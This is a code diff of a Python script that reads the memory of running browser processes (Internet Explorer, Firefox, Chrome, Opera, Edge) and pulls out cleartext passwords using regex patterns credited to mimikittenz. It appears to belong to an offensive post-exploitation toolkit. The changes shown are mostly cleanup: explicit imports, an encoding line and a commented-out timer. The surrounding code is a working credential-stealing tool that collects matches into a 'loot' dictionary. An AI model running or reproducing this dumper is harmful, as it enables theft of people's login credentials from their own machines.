@@ -1,16 +1,17 @@
 #!/usr/bin/env python
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Author: Nicolas VERDIER (contact@n1nj4.eu)
 
-""" 
+"""
 This script uses memorpy to dumps cleartext passwords from browser's memory
 It has been tested on both windows 10 and ubuntu 16.04
 The regex have been taken from the mimikittenz https://github.com/putterpanda/mimikittenz
 """
 
-from memorpy import *
+from memorpy import MemWorker, ProcessException
+
 import psutil
-import time
+import sys
 
 #from https://github.com/putterpanda/mimikittenz
 mimikittenz_regex=[
@@ -43,7 +44,7 @@ mimikittenz_regex=[
     ("Cpanel","user=.{1,50}&pass=.{1,50}"),
 ]
 def dump_browser_passwords():
-    start_time=time.time()
+    # start_time=time.time()
     loot={}
     if sys.platform=="win32":
         browser_list=["iexplore.exe", "firefox.exe", "chrome.exe", "opera.exe", "MicrosoftEdge.exe", "microsoftedgecp.exe"]
@@ -78,4 +79,3 @@ def dump_browser_passwords():
 
 if __name__=="__main__":
     print dump_browser_passwords()
-
